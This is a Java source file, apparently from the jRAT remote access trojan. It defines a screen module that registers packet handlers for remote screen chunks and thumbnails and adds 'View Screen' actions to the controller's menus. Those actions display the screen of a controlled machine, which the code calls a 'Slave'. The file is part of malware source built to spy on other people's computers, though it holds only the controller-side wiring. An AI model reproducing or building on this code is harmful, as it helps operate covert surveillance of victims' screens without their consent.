package jrat.module.screen;

import jrat.api.*;
import jrat.api.ui.ClientMenu;
import jrat.api.ui.ClientMenuItem;
import jrat.api.ui.ControlPanel;
import jrat.api.ui.ControlPanelAction;
import jrat.controller.AbstractSlave;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPackets;
import jrat.module.screen.packets.PacketRemoteScreenChunk;
import jrat.module.screen.packets.PacketRemoteScreenCompleted;
import jrat.module.screen.packets.PacketReceiveAllThumbnails;
import jrat.module.screen.ui.FrameRemoteScreen;

public class ScreenModule extends Module {

    public void init() throws Exception {
        IncomingPackets.register((short) 68, PacketRemoteScreenCompleted.class);
        IncomingPackets.register((short) 71, PacketReceiveAllThumbnails.class);
        IncomingPackets.register((short) 26, PacketRemoteScreenChunk.class);

        ClientMenuItem item = new ClientMenuItem("View Screen", Resources.getIcon("screen"), new ClientEventListener() {
            @Override
            public void emit(AbstractSlave slave) {
                FrameRemoteScreen.show((Slave) slave);
            }
        });

        ClientMenu.addItem(ClientMenu.Category.QUICK_OPEN, item);

        ControlPanelAction action = new ControlPanelAction(ControlPanel.Category.SYSTEM, "View Screen", Resources.getIcon("screen"));
        action.setAction(new ClientEventListener() {
            public void emit(AbstractSlave slave) {
                FrameRemoteScreen.show((Slave) slave);
            }
        });

        ControlPanel.ITEMS.add(action);
    }
}
